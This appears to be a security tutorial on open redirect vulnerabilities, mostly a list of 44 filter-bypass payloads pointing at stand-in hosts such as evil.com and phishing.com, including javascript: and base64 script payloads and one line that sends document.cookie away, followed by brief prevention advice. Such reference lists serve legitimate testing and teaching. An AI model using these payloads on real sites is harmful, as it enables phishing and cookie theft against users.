# Open redirect vulnerability

## What is an open redirect?

- It is a vulnerability that occurs when a website redirects users to a URL specified via a parameter without validating or restricting it.
- This allows an attacker to redirect users to malicious websites using the vulnerable site as a trusted bridge.

### Practical example

Imagine you have a link like this:  
`https://example.com/redirect?url=https://evil.com`  

If the website redirects the user directly to the value of the `url` parameter without checking its safety, then it's vulnerable to Open Redirect.

---

## How is it exploited?

1. The attacker crafts a URL like:  
   `https://example.com/redirect?url=https://phishing.com`
2. The victim clicks the link because it appears to be from a trusted domain (example.com).
3. The website redirects the victim to the malicious site (phishing.com).
4. The victim may enter sensitive information (e.g., credentials), which the attacker then captures.

---

## How can you bypass security filters?

1. `https://example.com/redirect?url=//phishing.com`  
   - Double slashes make it load as an absolute external URL.

2. `https://example.com/redirect?url=////phishing.com`  
   - Repeated slashes can bypass naive filters.

3. `https://example.com/redirect?url=javascript:confirm()`  
   - Triggers JavaScript execution directly.

4. `https://example.com/redirect?url=www.whitelisted.com.phishing.com`  
   - Subdomain trick to appear similar to a whitelisted domain.

5. `https://example.com/redirect?url=//phishing%E3%80%82com`  
   - Unicode dot (`。`) instead of a regular dot.

6. `https://example.com/redirect?url=https://phishing%E3%80%82com`  
   - Unicode dot in a fully qualified URL.

7. `https://example.com/redirect?url=//phishing%00.com`  
   - Null byte can bypass weak validations.

8. `https://example.com/redirect?url=whitelisted.com&url=phishing.com`  
   - Some servers read only the last repeated parameter.

9. `http://www.example.com@phishing.com`  
   - User-info section tricks users visually.

10. `https://www.example.com//phishing.com`  
    - Double slashes in the path to bypass filters.

11. `https://www.example.com%09.phishing.com`  
    - Using a tab character to confuse parsers.

12. `https://www.example.com%252e.phishing.com`  
    - Double-encoded dot to bypass validations.

13. `https://trusted.com@evil.com`  
    - Misleads with a trusted domain in the user-info part.

14. `https://evil.com/trusted.com`  
    - Looks like trusted domain is a directory.

15. `https://trusted.com%2F@evil.com`  
    - Encoded slash to trick filters.

16. `https://trusted.com%00.evil.com`  
    - Null byte to terminate strings.

17. `https://evil.com?x=https://trusted.com`  
    - Legit domain passed as a parameter, but base URL is malicious.

18. `https://evil.com/trusted-site.com/`  
    - Legit domain as a directory.

19. `https://evil.com@trusted-site.com/`  
    - Trusted domain after `@` misleading the user.

20. `https://example.com?url=https:evil.com`  
    - Missing slash in protocol to trick filters.

21. `https://example.com?url=javascript:alert(1)`  
    - Simple JavaScript injection.

22. `https://example.com?url=javascript%3Aalert(1)`  
    - URL-encoded JavaScript payload.

23. `https://example.com?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`  
    - Base64-encoded script execution.

24. `https://example.com?url=//google%E3%80%82com`  
    - Unicode dot for Google domain.

25. `https://example.com?url=//google%00.com`  
    - Null byte after a trusted domain.

26. `https://evil.c℀.example.com`  
    - Unicode character to split trusted domain visually.

27. `http://a.com／X.b.com`  
    - Fullwidth slash to trick parsers.

28. `https://example.com?url=javascript://%250Aalert(1)`  
    - Encoded newline in JavaScript scheme.

29. `https://example.com?url=javascript://%250Aalert(1)//?1`  
    - More complex JS bypass using comments.

30. `https://example.com?url=javascript://%250A1?alert(1):0`  
    - JS logic trick in the payload.

31. `https://example.com?url=%09Jav%09ascript:alert(document.domain)`  
    - Tab characters to bypass filters.

32. `https://example.com?url=javascript://%250Alert(document.location=document.cookie)`  
    - Inline JS payload to leak cookies.

33. `https://example.com?url=/%09/javascript:alert(1);`  
    - Using tabs in path to bypass basic filters.

34. `https://example.com?url=//%5cjavascript:alert(1);`  
    - Backslash encoding to trick parsers.

35. `https://example.com?url=/javascript:alert(1);`  
    - Direct JS payload in path.

36. `https://example.com?url=\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)`  
    - Obfuscated JS to trick regex filters.

37. `https://example.com?url=javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)`  
    - Capitalized JS scheme + line breaks.

38. `https://example.com?url=javascript:confirm(1)`  
    - Alternative JS function for testing.

39. `https://example.com?url=javascript://whitelisted.com//%0d%0aalert(1);`  
    - Mixing whitelisted domain and JS tricks.

40. `https://example.com?url=javascript://whitelisted.com?%a0alert(1)`  
    - Using non-breaking space to bypass.

41. `https://example.com?url=/x:1/:///%01javascript:alert(document.cookie)/`  
    - Complex nested trick with JS.

42. `https://example.com?url=";alert(0);//`  
    - Basic JS payload in parameter.

43. `https://example.com?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==`  
    - Another base64 encoded script execution.

44. `https://example.com?url=javascript:prompt(1)`  
    - Using `prompt` instead of `alert` to trick simple filters.

---

## Why is it dangerous?

- It can be used in phishing attacks.
- It breaks the trust users have in a legitimate site.
- It allows attackers to mask the real destination of a malicious link.

---

## How to prevent it?

- Filter redirect URLs: Only allow redirects to internal URLs or a trusted whitelist of domains.
- Validate the redirect target: Make sure the redirect URL is safe and expected.
- Avoid passing raw URLs in parameters: Use encrypted values or short-lived tokens instead.
